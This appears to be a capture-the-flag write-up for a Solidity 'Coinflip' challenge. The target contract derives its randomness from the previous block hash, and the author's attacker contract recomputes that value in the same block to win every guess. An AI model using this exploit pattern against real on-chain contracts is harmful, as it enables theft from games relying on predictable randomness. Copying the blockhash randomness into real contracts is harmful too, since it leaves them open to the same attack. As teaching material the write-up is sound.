## Coinflip

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

</p>
</details>

### Solution

Finally something mildly a challenge. I knew nothing about writing solidity code going into this, so getting the hang of remix ide (ew) and
the syntax was a step up in my game. Anyhow, I got through it with reasonable ease as I noticed the issue at hand at first glance:

```solidity
uint256 blockValue = uint256(blockhash(block.number.sub(1))); // This is static across the block. Not a true random. BIIIIIG mistake

if (lastHash == blockValue) { // Alright, so we have to do ONE transaction per block. Ughhhh
  revert();
}

lastHash = blockValue;
uint256 coinFlip = blockValue.div(FACTOR); // Not a true rando!!1!!1!
```

In a nutshell, if we were to proxy this call in the same block, we'd be able to "predict" the value of the coinflip and directly pass in the
right solution to the function.

So that's exactly what I did.

```solidity
contract CoinBye {
    using SafeMath for uint256;
    address public delegate;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        // Do nothing
    }

    function setAddy(address _delegate) public payable {
        delegate = _delegate;
    }

    function viewAddy() public payable returns (address) {
        return delegate;
    }

    function abuse() public returns (bool) {
        // Copy the exact formula from the contract
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        // Proxy it to our coinflip contract
        (bool status, bytes memory result) = delegate.call(
            abi.encodeWithSignature("flip(bool)", side)
        );

        // Return the result!
        return abi.decode(result, (bool));
    }
}
```


Annnnnd it works!
very pog indeed

